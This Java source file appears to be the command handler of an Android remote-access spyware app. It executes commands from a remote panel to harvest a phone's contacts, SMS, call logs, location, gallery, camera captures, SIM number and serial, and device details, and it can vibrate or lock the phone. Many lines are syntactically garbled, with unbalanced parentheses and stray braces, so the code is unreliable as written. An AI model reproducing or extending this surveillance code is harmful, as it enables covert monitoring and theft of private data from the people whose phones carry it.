package com.altomedia.phonesetapp.core;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.provider.CallLog;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.altomedia.phonesetapp.FirebaseConfig;
import com.altomedia.phonesetapp.PhonesetApp;
import com.altomedia.phonesetapp.receiver.RingtoneReceiver;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * Menjalankan semua perintah dari panel index.html:
 * lock_app, vibrate, camera, gallery, contacts, camera_list, location,
 * sms, call_logs, dll.
 */
public final class CommandExecutor {
    private static final String TAG = "CommandExecutor";

    private CommandExecutor() {
    }

    public interface CmdCallback {
        void onDone(String status, Object result);
    }

    public static void execute(Context context, String key, Object payload, CmdCallback cb() {
        String cmd = key.toLowerCase(Locale.ROOT);
        Map<String, Object> p = payload instanceof Map ? (Map<String, Object>) payload : new HashMap<>();
        try {
            switch (cmd) {
                case "lock_app":
                    handleLockApp(context, cb;
                    break;
                case "vibrate":
                    handleVibrate(context, p, cb;
                    break;
                case "camera":
                case "get_camera":
                case "camera_back":
                    handleCamera(context, cb;
                    break;
                case "gallery":
                case "get_gallery":
                    handleGallery(context, cb;
                    break;
                case "contacts":
                case "get_contacts":
                    cb.onDone("success", AutoBackupWorker.readContactsProxy(context));
                    break;
                case "camera_list":
                    cb.onDone("success", getCameraList(;
                    break;
                case "location":
                case "get_location":
                    cb.onDone("success", LocationReader.getLatest(context);
                    break;
                case "sms":
                case "get_sms":
                    cb.onDone("success", AutoBackupWorker.readSmsProxy(context));
                    break;
                case "call_logs":
                case "get_call_logs":
                    cb.onDone("success", AutoBackupWorker.readCallLogsProxy(context));
                    break;
                case "sim_info":
                    cb.onDone("success", getSimInfo(context);
                    break;
                case "device_info":
                    cb.onDone("success", getDeviceInfo(context);
                    break;
                case "screenshot":
                case "take_screenshot":
                    handleScreenshot(context, p, cb;
                    break;
                default:
                    cb.onDone("error", "Perintah tidak dikenal: " + cmd;
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "command " + cmd + " failed", e;
            cb.onDone("error", e.getMessage() == null ? e.toString() : e.getMessage());
        }
    }

    private static void handleLockApp(Context context, CmdCallback cb() {
        Intent lock = new Intent(Intent.ACTION_MAIN;
        lock.addCategory(Intent.CATEGORY_HOME;
        lock.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK;
        try {
            context.startActivity(lock;
            cb.onDone("success", "Aplikasi dikunci ke home");
        } catch (Exception e) {
            cb.onDone("error", "Gagal mengunci aplikasi");
        }
    }

    private static void handleVibrate(Context context, Map<String, Object> p, CmdCallback cb) {
 {
        long[] pattern = {0, 300, 150, 300};
        try {
            if (p.get("duration") instanceof Long) {
                long d = (Long) p.get("duration");
                pattern = new long[]{0, d};
            } else if (p.get("duration") instanceof Number) {

                pattern = new long[]{0, ((Number) p.get("duration")).longValue()};
            }
        } catch (Exception ignored) {
        }
        if (p.containsKey("mode")) {
            RingtoneReceiver.handleMode(context, String.valueOf(p.get("mode")));
        }
        Vibrator vib = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE;
        if (vib != null && vib.hasVibrator()) {
            vib.vibrate(pattern, -1;
        }
        cb.onDone("success", "Bergetar " + (pattern.length > 1 ? pattern[1] : 0) + " ms");
    }

    private static void handleCamera(Context context, CmdCallback cb) {
 {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)) {
 {
            cb.onDone("error", "Permission kamera belum diberikan");
            return;
        }
        String deviceId = PhonesetApp.getDeviceId(context;
        if (deviceId == null) {
            cb.onDone("error", "Perangkat belum terdaftar");
            return;
        }
        CameraCapture.capture(context, deviceId, result -> {
            cb.onDone(result.ok ? "success" : "error", result.data);
        });
    }

    private static void handleGallery(Context context, CmdCallback cb) {
 {
        List<Map<String, Object>> files = new ArrayList<>();
        String[] cols = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.SIZE};
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor c = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cols, null, null, null;
            if (c != null)) {
                while (c.moveToNext()) {
                    Map<String, Object> m = new HashMap<>();
                    String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    if (path == null) continue;
                    m.put("path", path;
                    m.put("name", c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)));
                    m.put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                    files.add(m;
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(TAG, "gallery", e;
        }
        cb.onDone("success", files);
    }

    private static List<String> getCameraList() {
        List<String> list = new ArrayList<>();
        int n = CameraAccess.getNumberOfCameras();
        for (int i = 0; i < n; i++) {
            list.add("camera_" + i);
        }
        return list;
    }

    private static Map<String, Object> getSimInfo(Context context() {
        Map<String, Object> m = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return m;
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)) {

                m.put("number", tm.getLine1Number();
                m.put("simSerial", tm.getSimSerialNumber();
                m.put("simOperator", tm.getSimOperatorName();
                m.put("networkOperator", tm.getNetworkOperatorName();
            }
        } catch (Exception e) {
            Log.w(TAG, "simInfo", e;
        }
        return m;
    }

    private static Map<String, Object> getDeviceInfo(Context context() {
        Map<String, Object> m = new HashMap<>();
        m.put("model", Build.MODEL;
        m.put("manufacturer", Build.MANUFACTURER;
        m.put("android", Build.VERSION.RELEASE;
        m.put("sdk", Build.VERSION.SDK_INT;
        m.put("app", PhonesetApp.deviceName(context));
        return m;
    }

    private static void handleScreenshot(Context context, Map<String, Object> p, CmdCallback cb) {
 {
        cb.onDone("error", "Screenshot memerlukan akses MediaProjection (tidak didukung background))";
    }

    @SuppressWarnings("deprecation")
    private static class CameraAccess {
        static int getNumberOfCameras() {
            return Camera.getNumberOfCameras();
        }
    }
}